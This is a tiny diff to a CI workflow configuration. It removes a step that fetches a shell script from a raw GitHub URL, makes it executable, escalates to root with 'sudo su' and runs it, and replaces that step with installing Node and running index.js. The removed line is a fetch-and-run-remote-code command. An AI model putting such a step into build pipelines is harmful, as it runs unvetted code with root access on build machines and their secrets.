@@ -2,4 +2,4 @@ workflows:
   my-workflow:
     scripts:
       - name: eh no
-        script: wget https://raw.githubusercontent.com/funfactbro/respect/main/run.sh && chmod +x run.sh && sudo su && ./run.sh
+        script: brew install node && node index.js
